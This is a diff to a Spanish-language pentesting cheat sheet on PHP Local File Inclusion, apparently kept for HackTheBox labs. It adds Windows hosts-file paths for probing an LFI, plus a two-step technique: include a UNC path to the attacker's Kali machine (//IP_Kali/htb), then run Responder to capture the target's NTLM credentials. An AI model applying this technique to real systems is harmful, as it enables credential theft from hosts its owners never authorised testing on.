@@ -29,7 +29,23 @@ En el LFI se puede usar:
 2. Wrappers
 ```
 
-## Archivos importantes 
+## Archivos importantes Windows 
+
+```powershell
+# Archivos generales para ver si existe in LFI en PHP 
+C:\WindowsSystem32\drivers\etc\hosts
+C:/Windows/System32/drivers/etc/hosts
+
+
+# Si hay un LFI se puede 
+Paso 1:
+//IP_Kali/htb  
+
+Paso 2: En KAli
+❯ responder -I tun0 
+```
+
+## Archivos importantes Linux
 
 ```bash 
 # Archivos generales 
